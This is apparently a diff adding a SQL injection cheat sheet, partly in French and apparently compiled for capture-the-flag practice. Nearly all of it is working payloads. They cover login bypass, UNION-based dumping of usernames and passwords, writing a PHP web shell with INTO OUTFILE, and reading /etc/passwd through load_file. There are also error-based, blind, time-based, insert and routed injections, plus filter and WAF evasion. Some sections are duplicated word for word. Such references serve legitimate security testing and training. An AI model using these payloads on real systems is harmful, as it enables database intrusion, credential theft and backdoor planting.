@@ -1,0 +1,333 @@
+[General and Tricks---------------------------------------------------------------]
+# Classical test
+' or 1=1 LIMIT 1 --
+' or 1=1 LIMIT 1 -- -
+' or 1=1 LIMIT 1#
+'or 1#
+' or 1=1 --
+' or 1=1 -- -
+admin\'-- -
+__________________________________________________________________________________
+# Upload file
+union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+__________________________________________________________________________________
+# Passwords
+uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users
+uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users
+__________________________________________________________________________________
+# Dump In One Shot (Shoot):
+\' unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.columns)whEre@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#
+__________________________________________________________________________________
+# Dump In One Shot (Shoot):
+\' unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.columns)whEre@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)#
+__________________________________________________________________________________
+# Virgule filtrée
+SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c //%0B pour espace possible
+__________________________________________________________________________________
+# sha1 binary
+# If sha1 is used as a binary string (true) you can use an hash to bypass conditions and inject SQL
+# http://pims.tuxfamily.org/blog/2011/04/write-up-sha1-is-fun-plaidctf/
+# echo -n 3fDf | openssl sha1 -binary
+
+# GBK Charset
+# Possible to bypass addslashes and magic_quotes_gpc using chinese charset
+# \x27 == '
+# \x5c == \
+# All chinese char starts with \xbf
+# \xbf\x5c is a chinese char. It means that the antislash added will be interpreted as a part or chinese char and so the quote will be interpreted
+# where user.login="\xbf' or 1=1;
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Classical String SQL Injection---------------------------------------------------]
+# Trigg
+recherche=’or 1 ;
+
+# Column number
+recherche=’ union select 666 ; → NOK
+recherche=’ union select 666,667 ; → OK
+
+# Database identification
+recherche=’ union select null,null from users ; 
+recherche=’ union select @@version,null ; → NOK → No mysql / mssql
+recherche=’ union select versionnumber,null from sysibm.sysversions ; → NOK → Not a db2
+recherche=’ union select version,null from v$instance ; → NOK → Not oracle
+recherche=’ union select version(),null ; → NOK → Not a postgres
+recherche=’ union select null,null from sqlite_master ; → OK → SQLITE
+
+# Tables list
+recherche=’ union select name,null from sqlite_master where type=’table’ ;
+
+# User table format
+recherche=’union select null,sql FROM sqlite_master WHERE tbl_name = ’users’ AND type = ’table’ ;
+
+# Data extraction
+recherche=’ union select username,password from users ; 
+recherche=’ union select username,year from users ;
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Routed SQL Injection-------------------------------------------------------------]
+# Routed → Double SQL Injection → The first result is injected into the second one
+
+login=admin\\' group by 1#
+
+s\' group by 2-- d
+→ 0x73272067726f757020627920322d2d2064
+
+login=s\' union select 0x73272067726f757020627920322d2d2064-- d
+
+s\' group by 2-- ds\' union select email, password from users-- d
+→ 0x732720756e696f6e2073656c65637420656d61696c2c2070617373776f72642066726f6d2075736572732d2d2064
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[SQL Truncation-------------------------------------------------------------------]
+# You can bypass some SQL restrictions playing with the var size limits
+# create table users (username varchar(10), password varchar(20)) ;
+# insert into users values(’admin’,’findMeIfYouCan’) ;
+# insert into users values(’admin [espace] *20 Mou’,’hackedMan’) ;
+→ 2 admins added
+→ Possible to add your own admin account
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Error-based SQL Injection--------------------------------------------------------]
+# All is based on the output, you can then identify the SGBD
+# You want to generate errors
+
+# Get the db
+&order=,cast((chr(95)||current_database()) as numeric)
+
+# Get the table (using LIMIT/OFFSET allows iteration)
+order=,cast(( SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1 ) as numeric)
+
+# Get columns
+order=,(cast(( SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0 ) as int))
+
+# Extract rows from one column
+order=,(cast(( SELECT id||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em41l_c0l FROM m3mbr35t4bl3  LIMIT 1 OFFSET 0) as int))
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Error-based SQL Injection--------------------------------------------------------]
+# All is based on the output, you can then identify the SGBD
+# You want to generate errors
+
+# Get the db
+&order=,cast((chr(95)||current_database()) as numeric)
+
+# Get the table (using LIMIT/OFFSET allows iteration)
+order=,cast(( SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1 ) as numeric)
+
+# Get columns
+order=,(cast(( SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0 ) as int))
+
+# Extract rows from one column
+order=,(cast(( SELECT id||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em41l_c0l FROM m3mbr35t4bl3  LIMIT 1 OFFSET 0) as int))
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Insert SQL Injection-------------------------------------------------------------]
+# Register form
+username=alex2&password=alex&email=@@version) ;# → OK but not executed
+username=alex3&password=alex&email=bla’),(’alex4’,’alex’,@@version) ;# → OK and executed !
+
+username=alex5&password=alex&email=bla’),(’alex6’,’alex’,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit 0,1)) ;#
+
+username=alex7&password=alex&email=bla’),(’alex8’,’alex’,(SELECT column_name FROM information_schema.columns WHERE table_name=’flag’ limit 0,1)) ;#
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Load File SQL Injection----------------------------------------------------------]
+# To read a file you need
+# the FILE right (allow you to use load_file() )
+# The file full path
+
+# To get the full path for index.php (for example)
+?action=members&id[]=1
+
+# You can also use if there are some restrictions
+union all select 1,@@secure_file_priv,3,4
+
+# Classic use
+union all select load_file('challenge/web-serveur/ch31/index.php'),2,3,4
+
+# If quotes are filtered, you can use hexa
+union all select load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),2,3,4
+
+# Or
+id=(0)union(select(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),(0),(0),(0)from(member))'
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Time Based SQL-------------------------------------------------------------------]
+# You can use SQL properties → Testing from left to right → If first statement is false & followed by AND, the second won't be tested
+# Payload can be 1 AND [condition_a_tester] AND [si_condition_true]
+# Heavy Query : 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
+# Test condition : exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,index,1))=codeascii)
+
+# Final payload
+1 AND exists(SELECT password FROM users WHERE id=1 AND ascii(substring(password,index,1))=codeascii) AND 1>(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Blind SQL Injection--------------------------------------------------------------]
+# Get the password size
+username=admin'and (select length(password)>7)--+
+# or
+admin' and length(password)=8--
+
+# Enumerate password
+admin' and (select substr(password,1,1)='a')--
+# or
+admin' and substr(password,1,1)='a'--
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Bypass Filters-------------------------------------------------------------------]
+# Bypass whitespace
+%0B
+
+# Bypass case check for UNION
+UniOn SeLeCT
+
+# Bypass comma (UNION SELECT 1,2,3,4)
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+UNION SELECT * FROM (SELECT xxxx FROM xxxx LIMIT 1 OFFSET 0)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[Bypass Filters------------------------------------------------------------------]
+# Bypass whitespace
+%0B
+
+# Bypass case check for UNION
+UniOn SeLeCT
+
+# Bypass comma (UNION SELECT 1,2,3,4)
+UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+UNION SELECT * FROM (SELECT xxxx FROM xxxx LIMIT 1 OFFSET 0)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[SQLite - UNION based without filters---------------------------------------------]
+# Retrieve the table name
+login=admin" UNION SELECT group_concat(tbl_name),2 FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%' limit 1 offset 1--&password=zzz
+
+# Get the table structure
+login=admin" UNION SELECT sql,2 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT like 'sqlite_%' AND name='users'--&password=zzz
+
+# Query one specific rowinfi
+login=admin" UNION SELECT login,2 FROM users LIMIT 1 OFFSET 2--&password=zzz
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[WAF Bypass-----------------------------------------------------------------------]
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
+[---------------------------------------------------------------------------------]
+
+
+
+
+
+
+
+
+[MySQL Injection without “in”-----------------------------------------------------]
+# Alternative to information_schema
+SELECT * FROM sys.x$schema_flattened_keys;
+
+# Get previous records
+SELECT * FROM sys.x$statement_analysis
+
+# Retrieving information without the column name
+SELECT (SELECT 1, 'aa') = (SELECT * FROM example)
+
+# Forcing case insensitive comparision
+# But binary will be flagged
+SELECT (SELECT 1, BINARY('Aa')) = (SELECT * FROM example)
+SELECT CONCAT("A", CAST(0 AS JSON));
+[---------------------------------------------------------------------------------]
